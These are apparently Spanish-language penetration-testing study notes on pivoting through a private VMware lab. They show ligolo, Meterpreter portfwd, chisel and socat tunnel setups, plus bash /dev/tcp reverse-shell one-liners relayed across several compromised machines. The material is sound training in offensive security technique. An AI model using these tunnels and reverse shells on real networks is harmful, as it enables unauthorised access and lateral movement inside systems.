Portforwarding

Kali tiene visibilidad con la red externa pero el Target B de la red externa no tiene visibilidad con Kali.

Transferencias de Archivos: abrir puerto 8080 de Target A para redirigir el tráfico al puerto 80 de Kali.

Reverse Shells: abrir puerto 4443 de Target A para redirigir el tráfico al puerto 443 de Kali.

Puertos de portforwarding tienen que ser > 1000.

Kali (consola proxy ligolo)

# --addr 0.0.0.0:8080 -> Todo tráfico que reciba Target A por el puerto 8080 lo manda a Kali
# --to 127.0.0.1:80   -> Redirecciona el tráfico a Kali por el puerto 80
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
listener_add --addr 0.0.0.0:4443 --to 127.0.0.1:443
listener_list

4. Port-Forwarding

Meterpreter

# -l <local_port> -p <puerto_objetivo_victima_final> -r <ip_victima_final>
portfwd add -l 5000 -p 80 -r 10.10.10.5
portfwd list # Listar portsforwarding activos

# Nos habremos traído a nuestra máquina atacante kali el puerto 80 de la victima.
# Desde navegador veremos en localhost:5000 la web de la victima final en el puerto 80

Una vez que Metasploit tiene una ruta/pivote a esa red mediante autoroute o route add, los módulos pueden abrir conexiones TCP directamente a la IP interna y puerto objetivo a través de la sesión comprometida.

El port-forward sirve para traer un servicio concreto al localhost. No es necesario para que Metasploit alcance SSH si ya puede enrutar tráfico TCP a través del pivote.

Si nos queremos conectar desde Kali por SSH a la máquina víctima final, sí haría falta port-forwarding. Si no, con proxychains va que chuta.

Ojo con los payloads porque deben ser bind.

Montar Escenario de Prueba

  • Máquina Linux Atacante
  • Máquina Windows 7 vulnerable Intermedia
  • Máquina Windows 7 vulnerable Final

Desde VMWare montamos los 3 sistemas operativos y configuramos las redes de forma que podamos montar el escenario de prueba.

Máquina Linux Atacante: ponemos la red en modo Bridge con esa sola interfaz.

Máquina Windows 7 vulnerable Intermedia: ponemos una interfaz en modo Bridge y otra en NAT, creando una red NAT propia con IP de Red, por ejemplo 10.10.10.0/24.

Máquina Windows 7 vulnerable Final: conectamos una sola interfaz a la misma NAT que la máquina intermedia.

Finalmente comprobamos que mediante ping la máquina Linux tenga accesibilidad con la máquina intermedia, pero no con la máquina final. La máquina intermedia debe tener conectividad con ambas mediante ping.

Chisel y Socat

Kali: 10.10.10.12

Maquina 1: 10.10.10.13 / 20.20.20.13

Maquina 2: 20.20.20.14 / 30.30.30.12

Maquina 3: 30.30.30.10

Chisel Repositorio: crea túneles de Kali a otras redes.

Socat Repositorio: crea túneles de otras redes a Kali.

Chisel (PortForwarding)

Kali Server puerto 9090

chisel server -p 9090 --reverse --socks5

Maquina 1 cliente: Portforwarding

# Conexión Socket: Máquina_1:9090 -> Kali:1080
# Portforwarding: Máquina_1:8080 -> Kali:80
# Portforwarding: Máquina_1:4443 -> Kali:443
chisel client 10.10.10.12:9090 R:1080:socks R:80:127.0.0.1:8080 R:443:127.0.0.1:4443

# Añadir al final del /etc/proxychains4.conf de kali -> 127.0.0.1 1080
# Ya tenemos visibilidad con la red azul y podemos transferir archivos a la máquina 2 desde máquina1:8080
proxychains whatweb 20.20.20.14

La red azul no tiene visibilidad con nosotros, no podríamos mandarnos una revshell. Para eso usamos socat, para entablar conexiones de otra red a Kali.

Socat (ReverseShell)

Maquina 1: redirigir puerto 1111 a Kali:443

# Si ponemos el puerto 9090 en vez de 443, lo mandamos a chisel server
socat tcp-l:1111,fork,reuseaddr tcp:10.10.10.12:443

Kali: escucha por el puerto 443

nc -nlvp 443

Maquina 2: reverse shell hacia el socat de Maquina 1

sh -i >& /dev/tcp/20.20.20.13/1111 0>&1

Tenemos conexión en ambas direcciones entre Kali, Maquina 1 y Maquina 2. Ahora seguimos pivotando hacia Maquina 3.

Maquina 1: redirigir puerto 2222 a Kali:9090

socat tcp-l:2222,fork,reuseaddr tcp:10.10.10.12:9090

Maquina 2: túnel chisel por el puerto 1080

chisel client 20.20.20.13:2222 R:1090:socks

Kali: nano /etc/proxychains4.conf

# Añadimos al final
127.0.0.1 1090
127.0.0.1 1080

Proxychains: Kali tiene visibilidad con la red verde

proxychains whatweb 30.30.30.10

Conseguimos visibilidad con la Maquina 3 con proxychains, pero Maquina 3 no tiene visibilidad con Kali.

Kali: escucha por el puerto 443

nc -nlvp 443

Maquina 1: red verde puerto 4000 hacia Kali:443

socat tcp-l:4000,fork,reuseaddr tcp:10.10.10.12:443

Maquina 2: túnel puerto 3333 hacia Maquina 1

socat tcp-l:3333,fork,reuseaddr tcp:20.20.20.13:4000

Maquina 3

sh -i >& /dev/tcp/30.30.30.12/3333 0>&1
